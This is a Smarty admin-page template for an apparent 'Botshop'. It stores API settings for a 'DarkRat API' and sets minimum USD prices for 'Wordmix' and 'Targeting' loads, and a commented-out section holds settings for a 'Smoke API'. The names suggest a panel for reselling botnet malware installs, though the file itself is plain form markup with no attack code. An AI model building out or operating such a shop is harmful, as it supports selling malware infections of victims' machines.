
{include file="header.tpl" title=foo}
{include file="nav.tpl" title=foo}

<div id="content-wrapper">
    <div class="container-fluid">

        <ol class="breadcrumb">
            <li class="breadcrumb-item">
                <a href="/admin">Admin</a>
            </li>
            <li class="breadcrumb-item active">Botshop</li>
        </ol>


        <div class="card mb-3">
            <div class="card-header">
                <i class="fas fa-table"></i>
                DarkRat API</div>
            <div class="card-body">
                <form method="post">
                    <label>API URL</label>
                    <input type="text" placeholder="API URL" value="{$apiInfo.api_url}" class="form-control" name="api_url">
                    <br>
                    <label>API KEY</label>
                    <input type="text" placeholder="API KEY" value="{$apiInfo.api_key}" class="form-control" name="api_key">
                    <br>
                    <label>Min Amount USD for Wordmix</label>
                    <input type="text" placeholder="API KEY" value="{$apiInfo.min_loads}" class="form-control" name="min_loads">
                    <br>
                    <label>Min Amount USD for Targeting</label>
                    <input type="text" placeholder="API KEY" value="{$apiInfo.min_loads_target}" class="form-control" name="min_loads_target">
                    <br>

                    <br>
                    <input type="submit" value="Save" class="form-control" name="update_darkrat_api">
                </form>
        </div>

<!--
            <div class="card mb-3">
                <div class="card-header">
                    <i class="fas fa-table"></i>
                    Smoke API</div>
                <div class="card-body">
                    <form method="post">
                        <input type="text" placeholder="API URL" value="{$apiInfoSmoke.api_url}" class="form-control" name="api_url">
                        <br>

                        <input type="text" placeholder="API KEY" value="{$apiInfoSmoke.api_key}" class="form-control" name="api_key">
                        <br>
                        <br>
                        <input type="submit" value="Save" class="form-control" name="update_smoke_api">
                    </form>
                </div>
-->

    </div>
</div>
{include file="footer.tpl"}
